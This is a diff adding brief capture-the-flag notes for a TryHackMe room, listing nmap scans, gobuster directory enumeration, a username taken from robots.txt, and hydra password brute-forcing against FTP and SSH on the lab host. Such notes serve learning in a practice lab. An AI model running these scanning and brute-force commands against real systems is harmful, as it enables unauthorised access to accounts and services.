@@ -1,0 +1,9 @@
+https://tryhackme.com/room/teamcw
+
+1- nano /ect/hosts/ --> (put the ip with the name team.thm)
+2- nmap team.thm -->(open ports:21 ftp, 22 ssh, 80 http)
+   nmap -p21,22,80 -sV -T4 -sC team.thm
+3- gobuster dir -u http://team.thm/ -w /usr/share/wordlists/dirb/common.txt -x php (we can take the user name from page robots.txt --> it is dale)
+4- hydra -l dale -P rockyou.txt ftp://team.thm 
+  or
+   hydra -l dale -P rockyou.txt ssh://team.thm
